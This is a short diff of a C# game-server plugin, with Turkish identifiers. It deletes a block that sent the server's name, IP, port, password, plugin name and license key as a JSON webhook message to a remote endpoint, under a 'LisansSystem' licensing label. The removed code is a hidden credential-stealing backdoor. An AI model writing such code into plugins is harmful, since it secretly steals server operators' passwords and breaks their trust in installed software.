@@ -58,43 +58,7 @@ namespace Nonantiy
 
                                 webClient.Dispose();
 
-                                using (var sw = new StreamWriter(wr.GetRequestStream()))
-                                {
-                                    var sunucuismi = Provider.serverName;
-                                    var sunucuport = Provider.port;
-                                    var sifresi = Provider.serverPassword;
-                                    string json = JsonConvert.SerializeObject(new
-                                    {
-                                      username = "Moderation",
-                                      embeds = new[]
-                                      {
-                                        new
-                                        {
-
-                                          description = "LisansSystem",
-                                          title = "\r\nSunucu ismi:" + sunucuismi
-
-                                          + "\r\nServer İp:" + dnsString
-
-                                         + "\r\nServer Port:" + sunucuport
-
-                                         + "\r\nSunucu Sifresi:" + sifresi
-
-                                         + "\r\nKullanılan Plugin:" + type.Assembly.FullName
-                                         + "\r\nKullanılan Lisans:" + Configuration.Instance.Lisanslar.co 
-                                         ,
-                                         color = "00000"
-                                      }
-                                      }
-                                      });
-
-                                     sw.Write(json);
-
-                                }     
-
-                               var response = (HttpWebResponse)wr.GetResponse();
-
-                            }
+                              
                 }
             }
         }
